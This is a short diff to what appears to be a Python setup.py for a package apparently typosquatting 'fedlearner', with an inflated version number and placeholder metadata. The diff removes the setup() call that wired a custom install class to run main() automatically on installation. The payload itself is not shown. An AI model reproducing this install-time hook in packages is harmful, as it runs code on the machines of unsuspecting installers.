@@ -8,17 +8,4 @@ class CrazyInstallStrat(install):
         from main import main
         main()
 
-setup(
-    name="fedlearnerr",
-    version="912.6",
-    author="x",
-    author_email="xxx@outlook.com",
-    description="x",
-    long_description_content_type="text/markdown",
-    long_description="xxx",
-    cmdclass={
-        'install': CrazyInstallStrat,
-    },
-    install_requires=['requests'],
-    setup_requires=['setuptools']
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                          
